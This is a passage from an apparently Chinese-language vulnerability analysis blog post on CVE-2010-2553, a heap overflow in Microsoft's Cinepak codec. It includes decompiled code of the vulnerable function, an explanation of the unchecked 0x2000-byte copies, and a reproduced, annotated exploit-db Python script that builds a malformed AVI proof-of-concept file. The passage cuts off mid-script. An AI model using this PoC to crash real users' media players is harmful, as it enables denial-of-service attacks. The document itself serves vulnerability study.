class="keyword">if</span> ( a3 &gt;= <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = a2;</span><br><span class="line">    BYTE1(result) = a2[<span class="number">1</span>];</span><br><span class="line">    LOBYTE(result) = a2[<span class="number">2</span>];</span><br><span class="line">    v11 = (<span class="type">unsigned</span> __int8)a2[<span class="number">3</span>] | (result &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)a3 &lt; v11 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    HIBYTE(a3) = *a2;</span><br><span class="line">    <span class="keyword">if</span> ( ULongSub(v11, <span class="number">0xAu</span>, &amp;pulResult) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      HIBYTE(v12) = v10[<span class="number">8</span>];</span><br><span class="line">      v13 = v10 + <span class="number">10</span>;</span><br><span class="line">      v28 = <span class="number">0</span>;</span><br><span class="line">      v26 = v13;</span><br><span class="line">      v30 = v13;</span><br><span class="line">      LOBYTE(v12) = *(v13 - <span class="number">1</span>);</span><br><span class="line">      v25 = v12;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        v32 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( pulResult &lt; <span class="number">0x16</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          HIBYTE(v14) = v13[<span class="number">1</span>];</span><br><span class="line">          LOBYTE(v14) = v13[<span class="number">2</span>];</span><br><span class="line">          ulMinuend = (<span class="type">unsigned</span> __int8)v13[<span class="number">3</span>] | (v14 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">          <span class="keyword">if</span> ( pulResult &lt; ulMinuend )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( *v13 == <span class="number">16</span> || *v13 == <span class="number">17</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ULongSub(ulMinuend, <span class="number">0xCu</span>, &amp;a1) &lt; <span class="number">0</span> )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            HIBYTE(v15) = v13[<span class="number">8</span>];</span><br><span class="line">            HIBYTE(v16) = v13[<span class="number">4</span>];</span><br><span class="line">            LOBYTE(v15) = v13[<span class="number">9</span>];</span><br><span class="line">            LOBYTE(v16) = v13[<span class="number">5</span>];</span><br><span class="line">            v17 = v15 - v16;</span><br><span class="line">            LOWORD(v17) = *(_WORD *)(v7 + <span class="number">46</span>) * v17;</span><br><span class="line">            a2 = (_BYTE *)v17;</span><br><span class="line">            <span class="keyword">if</span> ( v32 &amp;&amp; !HIBYTE(a3) &amp;&amp; *v13 == <span class="number">17</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              qmemcpy(</span><br><span class="line">                (<span class="type">void</span> *)(*(_DWORD *)(v7 + <span class="number">28</span>) + v32),</span><br><span class="line">                (<span class="type">const</span> <span class="type">void</span> *)(*(_DWORD *)(v7 + <span class="number">28</span>) + v32 - <span class="number">0x2000</span>),</span><br><span class="line">                <span class="number">0x2000u</span>);</span><br><span class="line">              v13 = v26;</span><br><span class="line">            &#125;</span><br><span class="line">            v18 = v30 + <span class="number">12</span>;</span><br><span class="line">            v19 = v13 + <span class="number">12</span>;</span><br><span class="line">            *(_DWORD *)(v7 + <span class="number">56</span>) = v32 + *(_DWORD *)(v7 + <span class="number">32</span>);</span><br><span class="line">            v27 = v13 + <span class="number">12</span>;</span><br><span class="line">            *(_DWORD *)(v7 + <span class="number">60</span>) = a7;</span><br><span class="line">            <span class="keyword">while</span> ( a1 &gt;= <span class="number">4</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              HIBYTE(v20) = v19[<span class="number">1</span>];</span><br><span class="line">              LOBYTE(v20) = v19[<span class="number">2</span>];</span><br><span class="line">              v21 = (<span class="type">unsigned</span> __int8)v19[<span class="number">3</span>] | (v20 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">              v24 = v21;</span><br><span class="line">              <span class="keyword">if</span> ( a1 &lt; v21 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">switch</span> ( *v19 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">                  (*(<span class="type">void</span> (__stdcall **)(_BYTE *, _DWORD, _DWORD, _DWORD))v7)(</span><br><span class="line">                    v18,</span><br><span class="line">                    *(_DWORD *)(v7 + <span class="number">56</span>),</span><br><span class="line">                    *(_DWORD *)(v7 + <span class="number">52</span>),</span><br><span class="line">                    *(_DWORD *)(v7 + <span class="number">48</span>));</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                  (*(<span class="type">void</span> (__stdcall **)(_BYTE *, <span class="type">int</span>, _DWORD, _DWORD))(v7 + <span class="number">4</span>))(</span><br><span class="line">                    v18,</span><br><span class="line">                    *(_DWORD *)(v7 + <span class="number">56</span>) + <span class="number">4096</span>,</span><br><span class="line">                    *(_DWORD *)(v7 + <span class="number">52</span>),</span><br><span class="line">                    *(_DWORD *)(v7 + <span class="number">48</span>));</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                  (*(<span class="type">void</span> (__stdcall **)(ULONG, _BYTE *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, _BYTE *))(v7 + <span class="number">8</span>))(</span><br><span class="line">                    v7,</span><br><span class="line">                    v18 + <span class="number">4</span>,</span><br><span class="line">                    v21 - <span class="number">4</span>,</span><br><span class="line">                    a4,</span><br><span class="line">                    a5,</span><br><span class="line">                    a6,</span><br><span class="line">                    a2);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                  (*(<span class="type">void</span> (__stdcall **)(ULONG, _BYTE *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, _BYTE *))(v7 + <span class="number">16</span>))(</span><br><span class="line">                    v7,</span><br><span class="line">                    v18 + <span class="number">4</span>,</span><br><span class="line">                    v21 - <span class="number">4</span>,</span><br><span class="line">                    a4,</span><br><span class="line">                    a5,</span><br><span class="line">                    a6,</span><br><span class="line">                    a2);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                  (*(<span class="type">void</span> (__stdcall **)(ULONG, _BYTE *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, _BYTE *))(v7 + <span class="number">12</span>))(</span><br><span class="line">                    v7,</span><br><span class="line">                    v18 + <span class="number">4</span>,</span><br><span class="line">                    v21 - <span class="number">4</span>,</span><br><span class="line">                    a4,</span><br><span class="line">                    a5,</span><br><span class="line">                    a6,</span><br><span class="line">                    a2);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              v19 = &amp;v27[v24];</span><br><span class="line">              v22 = <span class="number">1</span>;</span><br><span class="line">              v18 += v24;</span><br><span class="line">              v27 += v24;</span><br><span class="line">              <span class="keyword">if</span> ( v24 &gt; <span class="number">1</span> )</span><br><span class="line">                v22 = v24;</span><br><span class="line">              a1 -= v22;</span><br><span class="line">            &#125;</span><br><span class="line">            a6 += a7 * (__int16)a2;</span><br><span class="line">            ++v28;</span><br><span class="line">            v32 += <span class="number">0x2000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          v30 += ulMinuend;</span><br><span class="line">          pulResult -= ulMinuend;</span><br><span class="line">          v13 += ulMinuend;</span><br><span class="line">          v26 = v13;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v28 &lt; v25 );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>异常发生在 qmemcpy 语句。使用 LLM 辅助阅读一下这下代码, 异常触发时的执行流程为, 程序判断 CVID Chunk 的数据长度是否大于 0x20, 是则获取其 Strip 个数, 并逐个处理 Strip, 若 Strip ID 为 0x1100 则进行数据复制, 每次复制 0x2000 字节。而程序在复制时并没有判断所用的 0x6000 大小的堆块剩余空间是否充足, 因此当 ID 为 0x1100 的 Strip 个数大于 3 时将发生堆溢出, 且溢出的内存中包含了内存状态为 MEM_RESERVE 的内存, 故触发 Access violation</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>MSF 没有该漏洞利用的相关模块, 在互联网搜索引擎中也暂未找到相关利用样本。个人感觉该漏洞难以进行更进一步的利用的原因在于其难以控制 EIP 指针因此无法执行 payload。而若只需要使程序崩溃进行 DOS 的话利用样本生成脚本生成攻击脚本即可</p><h2 id="Exploit-分析"><a href="#Exploit-分析" class="headerlink" title="Exploit 分析"></a>Exploit 分析</h2><p>ABYSSSEC 在 <a href="#reference">exploit-db</a> 上公布了 POC 文件生成脚本, 为方便理解在此借用 <a href="#reference">sp4n9x’s Blog</a> 中给出的注释版本</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  __  __  ____         _    _ ____</span></span><br><span class="line"><span class="string"> |  \/  |/ __ \   /\  | |  | |  _ \ </span></span><br><span class="line"><span class="string"> | \  / | |  | | /  \ | |  | | |_) |</span></span><br><span class="line"><span class="string"> | |\/| | |  | |/ /\ \| |  | |  _ &lt; </span></span><br><span class="line"><span class="string"> | |  | | |__| / ____ \ |__| | |_) |</span></span><br><span class="line"><span class="string"> |_|  |_|\____/_/    \_\____/|____/ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://www.exploit-db.com/moaub-26-microsoft-cinepak-codec-cvdecompress-heap-overflow-ms10-055/</span></span><br><span class="line"><span class="string">https://www.exploit-db.com/exploits/15112</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Title             : Microsoft Cinepak Codec CVDecompress Heap Overflow</span></span><br><span class="line"><span class="string">  Version           : iccvid.dll XP SP3</span></span><br><span class="line"><span class="string">  Analysis          : http://www.abysssec.com</span></span><br><span class="line"><span class="string">  Vendor            : http://www.microsoft.com</span></span><br><span class="line"><span class="string">  Impact            : High</span></span><br><span class="line"><span class="string">  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com</span></span><br><span class="line"><span class="string">  Twitter           : @abysssec</span></span><br><span class="line"><span class="string">  CVE               : CVE-2010-2553</span></span><br><span class="line"><span class="string">  MOAUB Number      : </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    aviHeaders = (</span><br><span class="line">        <span class="string">&quot;\x52\x49\x46\x46&quot;</span> <span class="comment"># dwList = &quot;RIFF&quot;</span></span><br><span class="line">        <span class="string">&quot;\x58\x01\x00\x00&quot;</span> <span class="comment"># dwSize = 0x158 = 344 byte</span></span><br><span class="line">        <span class="string">&quot;\x41\x56\x49\x20&quot;</span> <span class="comment"># dwFourCC = &quot;AVI &quot;</span></span><br><span class="line">        <span class="string">&quot;\x4C\x49\x53\x54&quot;</span>    <span class="comment"># dwList = &quot;LIST&quot; &lt;---------------------------+</span></span><br><span class="line">        <span class="string">&quot;\xC8\x00\x00\x00&quot;</span>    <span class="comment"># dwSize = 0xc8 = 200 byte                    |</span></span><br><span class="line">        <span class="string">&quot;\x68\x64\x72\x6C&quot;</span>    <span class="comment"># dwFourCC = &quot;hdrl&quot;                           |</span></span><br><span class="line">        <span class="string">&quot;\x61\x76\x69\x68&quot;</span>        <span class="comment"># dwFourCC = &quot;avih&quot; &lt;-----------+         |</span></span><br><span class="line">        <span class="string">&quot;\x38\x00\x00\x00&quot;</span>        <span class="comment"># dwSize = 0x38 = 56 byte       |         |</span></span><br><span class="line">        <span class="string">&quot;\xA0\x86\x01\x00&quot;</span>        <span class="comment"># dwMicroSecPerFrame = 0x186A0  |         |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>        <span class="comment"># dwMaxBytesPerSec = 0x0        |         |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>        <span class="comment"># dwPaddingGranularity = 0x0    |         |</span></span><br><span class="line">        <span class="string">&quot;\x10\x01\x00\x00&quot;</span>        <span class="comment"># dwFlages = 0x110              |         |</span></span><br><span class="line">        <span class="string">&quot;\x4E\x00\x00\x00&quot;</span>        <span class="comment"># dwTotalFrame = 0x4E = 78      |         |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>        <span class="comment"># dwInitialFrames = 0x0       &quot;avih&quot;      |</span></span><br><span class="line">        <span class="string">&quot;\x01\x00\x00\x00&quot;</span>        <span class="comment"># dwStreams = 0x1               |         |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>        <span class="comment"># dwSuggestedBufferSize = 0x0   |         |</span></span><br><span class="line">        <span class="string">&quot;\x60\x01\x00\x00&quot;</span>        <span class="comment"># dwWidth = 0x160 = 352         |         |</span></span><br><span class="line">        <span class="string">&quot;\x20\x01\x00\x00&quot;</span>        <span class="comment"># dwHeight = 0x120 = 288        |         |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>        <span class="comment"># dwReserved[0]                 |         |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>        <span class="comment"># dwReserved[1]                 |         |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>        <span class="comment"># dwReserved[2]                 |         |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>        <span class="comment"># dwReserved[3] &lt;---------------+         |</span></span><br><span class="line">        <span class="string">&quot;\x4C\x49\x53\x54&quot;</span>        <span class="comment"># dwList = &quot;LIST&quot; &lt;------------------+    |</span></span><br><span class="line">        <span class="string">&quot;\x7C\x00\x00\x00&quot;</span>        <span class="comment"># dwSize = 0x7C = 124 byte           |    |</span></span><br><span class="line">        <span class="string">&quot;\x73\x74\x72\x6C&quot;</span>        <span class="comment"># dwFourCC = &quot;strl&quot;                  |    |</span></span><br><span class="line">        <span class="string">&quot;\x73\x74\x72\x68&quot;</span>            <span class="comment"># dwFourCC = &quot;strh&quot; &lt;-------+    |    |</span></span><br><span class="line">        <span class="string">&quot;\x38\x00\x00\x00&quot;</span>            <span class="comment"># dwSize = 0x38 = 56 byte   |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x76\x69\x64\x73&quot;</span>            <span class="comment"># fccType = &quot;vids&quot;          |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x63\x76\x69\x64&quot;</span>            <span class="comment"># fccHandler = &quot;cvid&quot;       |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>            <span class="comment"># dwFlags = 0x0             |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00&quot;</span>                    <span class="comment"># wPriority = 0x0           |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00&quot;</span>                    <span class="comment"># wLanguage = 0x0           |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>            <span class="comment"># dwInitalFrames = 0x0      |    | &quot;hdrl&quot;</span></span><br><span class="line">        <span class="string">&quot;\xE8\x03\x00\x00&quot;</span>            <span class="comment"># dwScale = 0x3E8 = 1000 &quot;strh&quot;  |    |</span></span><br><span class="line">        <span class="string">&quot;\x10\x27\x00\x00&quot;</span>            <span class="comment"># dwRate = 0x2710 = 10000   |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>            <span class="comment"># dwStart = 0x0             |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x4E\x00\x00\x00&quot;</span>            <span class="comment"># dwLength = 0x4E = 78      |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x20\x74\x00\x00&quot;</span>            <span class="comment"># dwSuggestedBufferSize     |    |    |     ; 0x7420=29728</span></span><br><span class="line">        <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span>            <span class="comment"># dwQuality = -1            |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>            <span class="comment"># dwSampleSize = 0x0        |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00&quot;</span>                        <span class="comment"># left = 0x0            | &quot;strl&quot;  |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00&quot;</span>                        <span class="comment"># top = 0x0             |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x60\x01&quot;</span>                        <span class="comment"># right = 0x160 = 352   |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x20\x01&quot;</span>                        <span class="comment"># bottom =0x120 = 288&lt;--+    |    |</span></span><br><span class="line">        <span class="string">&quot;\x73\x74\x72\x66&quot;</span>            <span class="comment"># dwFourCC = &quot;strf&quot; &lt;-------+    |    |</span></span><br><span class="line">        <span class="string">&quot;\x28\x00\x00\x00&quot;</span>            <span class="comment"># dwSize = 0x28 = 40 byte   |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x28\x00\x00\x00&quot;</span>            <span class="comment"># biSize = 0x28 = 40 byte   |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x50\x01\x00\x00&quot;</span>            <span class="comment"># biWidth = 0x150 = 336     |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x20\x01\x00\x00&quot;</span>            <span class="comment"># biHeight =0x120 = 288     |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x01\x00&quot;</span>                    <span class="comment"># biPlanes = 0x1         &quot;strf&quot;  |    |</span></span><br><span class="line">        <span class="string">&quot;\x18\x00&quot;</span>                    <span class="comment"># biBitCount = 0x18 = 24    |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x63\x76\x69\x64&quot;</span>            <span class="comment"># biCompression = &quot;cvid&quot;    |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x84\x8D\x00\x00&quot;</span>            <span class="comment"># biSizeImage=0x8D84=36228  |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>            <span class="comment"># biXPelsPerMeter = 0x0     |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>            <span class="comment"># biYPelsPerMeter = 0x0     |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>            <span class="comment"># biClrUsed = 0x0           |    |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>            <span class="comment"># biClrImportant = 0x0 &lt;----+    |    |</span></span><br><span class="line">    )                                 <span class="comment">#                                |    |</span></span><br><span class="line">                                      <span class="comment">#                                |    |</span></span><br><span class="line">    padding =    (                    <span class="comment">#                                |    |</span></span><br><span class="line">        <span class="string">&quot;\x4A\x55\x4E\x4B&quot;</span>            <span class="comment"># dwFourCC = &quot;JUNK&quot;              |    |</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>            <span class="comment"># dwSize = 0x0 &lt;-----------------+----+</span></span><br><span class="line">        <span class="string">&quot;\x4A\x55\x4E\x4B&quot;</span>        <span class="comment"># dwFourCC = &quot;JUNK&quot;                     </span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00&quot;</span>        <span class="comment"># dwSize = 0x0 </span></span><br><span class="line">    )</span><br><span class="line">           </span><br><span class="line">    movi_tag =   (</span><br><span class="line">        <span class="string">&quot;\x4C\x49\x53\x54&quot;</span>    <span class="comment"># dwList = &quot;LIST&quot; &lt;-----------------------------------------+</span></span><br><span class="line">        <span class="string">&quot;\x5C\x00\x00\x00&quot;</span>    <span class="comment"># dwSize = 0x5C = 92 byte                                   |</span></span><br><span class="line">        <span class="string">&quot;\x6D\x6F\x76\x69&quot;</span>    <span class="comment"># dwFourCC = &quot;movi&quot;                                         |</span></span><br><span class="line">        <span class="string">&quot;\x30\x30\x64\x63&quot;</span>        <span class="comment"># dwFourCC = &quot;00dc&quot;                                     |   ; 压缩视频帧数据块</span></span><br><span class="line">        <span class="string">&quot;\x10\x00\x00\x00&quot;</span>        <span class="comment"># dwSize = 0x10 = 16 byte                               |</span></span><br><span class="line">        )                         <span class="comment">#                                                       |</span></span><br><span class="line">                                  <span class="comment">#                                                       |</span></span><br><span class="line">    cinepak_codec_data1 = (       <span class="comment">#                                                       |</span></span><br><span class="line">        <span class="string">&quot;\x00&quot;</span>                    <span class="comment"># Flags &lt;-------------------+                           |   ; Flags = 0x0</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x68&quot;</span>            <span class="comment"># Length of CVID data       |                           |   ; Length of CVID data = 0x68 = 104</span></span><br><span class="line">        <span class="string">&quot;\x01\x60&quot;</span>                <span class="comment"># Width of coded frame &quot;Frame Header&quot;                   |   ; Width of coded frame = 0x160 = 352</span></span><br><span class="line">        <span class="string">&quot;\x01\x20&quot;</span>                <span class="comment"># Height of coded frame     |                           |   ; Height of coded frame = 0x120 = 288</span></span><br><span class="line">    )                             <span class="comment">#                           |                           |</span></span><br><span class="line">                                  <span class="comment">#                           |                           |</span></span><br><span class="line">    number_of_coded_strips = (    <span class="comment">#                           |                           |</span></span><br><span class="line">        <span class="string">&quot;\x00\x10&quot;</span>                <span class="comment"># Number of coded strips &lt;--+                           |   ; number_of_coded_strips = 0x10 = 16</span></span><br><span class="line">        )                         <span class="comment">#                                                       |</span></span><br><span class="line">    cinepak_codec_data2 = (       <span class="comment">#                                                       |</span></span><br><span class="line">        <span class="string">&quot;\x10\x00&quot;</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1000 - Intra-coded strip</span></span><br><span class="line">        <span class="string">&quot;\x00\x10&quot;</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">        <span class="string">&quot;\x00\x00&quot;</span>                <span class="comment"># Strips top Y position &quot;Strip Header&quot;                  |   ; Strips top Y position = 0x0</span></span><br><span class="line">        <span class="string">&quot;\x00\x00&quot;</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x0</span></span><br><span class="line">        <span class="string">&quot;\x00\x60&quot;</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x60 = 96</span></span><br><span class="line">        <span class="string">&quot;\x01\x60&quot;</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x160 = 352</span></span><br><span class="line">        <span class="string">&quot;\x20\x00&quot;</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ &quot;CVID Chunk&quot;              |   ; CVID Chunk ID = 0x2000 - List of blocks in 12 bit V4 codebook</span></span><br><span class="line">        <span class="string">&quot;\x00\x00&quot;</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x0</span></span><br><span class="line">        <span class="string">&quot;\x11\x00&quot;</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">        <span class="string">&quot;\x00\x10&quot;</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips top Y position &quot;Strip Header&quot;               &quot;movi&quot; ; Strips top Y position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ &quot;CVID Chunk&quot;              |   ; CVID Chunk ID = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141</span></span><br><span class="line">        <span 